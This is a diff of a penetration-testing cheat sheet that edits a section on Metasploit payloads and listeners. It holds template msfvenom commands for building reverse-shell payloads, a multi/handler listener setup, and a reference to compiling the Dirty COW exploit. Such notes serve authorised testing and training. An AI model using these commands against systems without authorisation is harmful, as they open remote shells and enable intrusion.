@@ -371,7 +371,7 @@ use auxiliary/scanner/ssh/ssh_enumusers
 - [AV Evasion and Obfuscation](#AV-Evasion-and-Obfuscation)
 - [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
 - [Linux Compilation](#Linux-Compilation)
-- [MSF Payloads](#MSF-Payloads)
+- [MSF Payloads and Listeners](#MSF-Payloads-and-Listeners)
   - [msfvenom](#msfvenom)
 - [XODA 0.4.5](#XODA-045)
 - [Windows Cross-Compilation](#Windows-Cross-Compilation)
@@ -463,7 +463,7 @@ gcc -pthread 40839.c -o dirty -lcrypt
 
 ## MSF Payloads and Listeners
 - 64-bit (`x64`) payload cannot run on 32-bit architecture.
-- Staged payload (sent in 2 parts), non-staged/line payload (exploit and shellcode sent separately).
+- Staged payload (sent in 2 parts), non-staged/inline payload (exploit and shellcode sent separately).
   - `windows/x64/meterpreter/reverse_tcp` is staged.
   - `windows/x64/meterpreter_reverse_tcp` is non-staged.
 
@@ -472,11 +472,11 @@ windows/meterpreter/reverse_tcp
 windows/x64/meterpreter/reverse_tcp
 windows/meterpreter/bind_tcp
 ```
-- Used in PTS course.
+- For quick reference.
 
 ```
 use multi/handler
-set payload windows/meterpreter/reverse_tcp
+set payload <payload>
 set LHOST <ip>
 set LPORT <port>
 ```
@@ -485,9 +485,7 @@ set LPORT <port>
 - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
 
 ```
-msfvenom
-
-msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <filename>.<format>
+msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <filename>
 ```
 - `<architecture>`: `x86`, `x64`
 - `<payload>`: Pick your poison from `msfvenom --list payloads`
